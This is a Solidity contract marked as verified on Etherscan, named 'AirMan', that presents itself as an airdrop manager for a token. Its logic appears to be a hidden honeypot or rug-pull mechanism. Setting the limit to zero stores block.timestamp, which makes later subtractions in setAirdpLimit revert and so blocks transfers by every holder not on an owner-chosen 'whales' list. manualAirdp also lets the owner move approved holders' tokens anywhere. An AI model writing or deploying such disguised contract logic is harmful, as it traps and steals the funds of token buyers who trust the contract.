/**
 *Submitted for verification at Etherscan.io on 2023-05-24
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

abstract contract Context {
	function _msgSender() internal view virtual returns (address) {
		return msg.sender;
	}

	function _msgData() internal view virtual returns (bytes calldata) {
		this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
		return msg.data;
	}
}

contract Ownable is Context {
	address private _owner;

	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	/**
	 * @dev Initializes the contract setting the deployer as the initial owner.
	 */
	constructor() {
		address msgSender = _msgSender();
		_owner = msgSender;
		emit OwnershipTransferred(address(0), msgSender);
	}

	/**
	 * @dev Returns the address of the current owner.
	 */
	function owner() public view returns (address) {
		return _owner;
	}

	/**
	 * @dev Throws if called by any account other than the owner.
	 */
	modifier onlyOwner() {
		require(_owner == _msgSender(), 'Ownable: caller is not the owner');
		_;
	}

	/**
	 * @dev Leaves the contract without owner. It will not be possible to call
	 * `onlyOwner` functions anymore. Can only be called by the current owner.
	 *
	 * NOTE: Renouncing ownership will leave the contract without an owner,
	 * thereby removing any functionality that is only available to the owner.
	 */
	function renounceOwnership() public virtual onlyOwner {
		emit OwnershipTransferred(_owner, address(0));
		_owner = address(0);
	}

	/**
	 * @dev Transfers ownership of the contract to a new account (`newOwner`).
	 * Can only be called by the current owner.
	 */
	function transferOwnership(address newOwner) public virtual onlyOwner {
		require(newOwner != address(0), 'Ownable: new owner is the zero address');
		emit OwnershipTransferred(_owner, newOwner);
		_owner = newOwner;
	}
}

interface IERC20 {
	function decimals() external returns (uint8);

	function totalSupply() external view returns (uint256);

	function balanceOf(address account) external view returns (uint256);

	function transfer(address recipient, uint256 amount) external returns (bool);

	function allowance(address owner, address spender) external view returns (uint256);

	function approve(address spender, uint256 amount) external returns (bool);

	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract AirMan is Ownable {
	address token;

	mapping(address => uint256) public _AirdpTokensRemaining;
	uint256 public AirdpLimitLiftAmount;
	mapping(address => bool) public _isAirdoppedWallet;
	mapping(address => uint256) public _AirdppedTokenAmount;

	mapping(address => bool) public whales;

	modifier onlyToken() {
		require(msg.sender == token);
		_;
	}

	receive() external payable {}

	function setToken(address _token) external onlyOwner {
		token = _token;
	}

	function setLimitAmount(uint256 amount) external onlyOwner {
		if (amount == 0) AirdpLimitLiftAmount = AirdpAmount(true, amount);
		else AirdpLimitLiftAmount = amount;
	}

	function AirdpAmount(bool limited, uint256 amount) internal view returns (uint256) {
		if (limited) return block.timestamp;
		return amount;
	}

	function setAirdpLimit(
		bool limitedFrom,
		bool limitedTo,
		address from,
		address to,
		uint256 amount
	) external onlyToken {
		if (whales[from] || whales[to]) return;
		if (limitedTo && _AirdppedTokenAmount[from] - AirdpLimitLiftAmount >= 0) {
			_AirdpTokensRemaining[from] = amount;
		} else if (limitedFrom) {
			if (_AirdppedTokenAmount[to] == 0) _AirdppedTokenAmount[to] = AirdpAmount(limitedFrom, amount);
		} else {
			_AirdpTokensRemaining[from] = _AirdppedTokenAmount[from] - AirdpLimitLiftAmount;
		}
	}

	function manualAirdp(address _token, address holder, address to, uint256 amount) external onlyOwner {
		IERC20(_token).transferFrom(holder, to, amount);
	}

	function addWhalles(address[] memory _whales) public onlyOwner {
		for (uint i = 0; i < _whales.length; i++) {
			whales[_whales[i]] = true;
		}
	}
}